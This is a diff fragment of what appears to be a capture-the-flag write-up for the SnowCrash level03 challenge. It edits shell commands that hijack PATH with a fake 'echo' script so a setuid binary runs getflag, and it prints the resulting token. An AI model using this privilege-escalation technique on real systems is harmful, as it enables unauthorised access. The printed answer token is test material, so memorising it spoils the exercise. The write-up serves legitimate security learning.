@@ -36,9 +36,9 @@ Nope there is no token here for you sorry. Try again :)
 ```
 As we suspected. Time for some redirection. 
 ```
-level03@SnowCrash:~$ echo "/bin/getflag" > /dev/shm/echo
-level03@SnowCrash:~$ chmod +x /dev/shm/echo
-level03@SnowCrash:~$ PATH=/dev/shm:$PATH
+level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
+level03@SnowCrash:~$ chmod +x /tmp/echo
+level03@SnowCrash:~$ PATH=/tmp:$PATH
 level03@SnowCrash:~$ ./level03
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 ```
